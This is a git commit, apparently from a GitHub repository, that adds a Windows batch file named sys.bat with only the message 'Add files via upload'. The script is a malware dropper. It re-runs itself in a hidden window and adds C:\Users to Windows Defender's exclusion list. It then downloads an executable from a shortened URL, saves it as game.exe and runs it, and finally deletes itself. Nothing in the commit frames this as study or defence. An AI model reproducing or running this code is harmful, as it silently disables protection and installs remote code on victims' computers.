f5d8b3be8388b9be712b28c723cb1ceaa79113e4
sys!!+root <79191180+Algorithm99root@users.noreply.github.com>
2026-01-26 03:23:31 +0000

    Add files via upload

---
+++ sys.bat
@@ -0,0 +1,21 @@
+ÿþ&cls
+@echo off
+
+if "%1" neq "hidden" (
+  powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden -WindowStyle Hidden"
+  exit
+)
+
+powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users' -ErrorAction SilentlyContinue"
+
+
+timeout /t 3 /nobreak >nul
+
+set "URL=https://tinyurl.com/my0xfuck"
+set "OUT=%~dp0game.exe"
+
+curl -L "%URL%" -o "%OUT%"
+start "" "%OUT%"
+
+timeout /t 2 >nul
+del "%~f0"
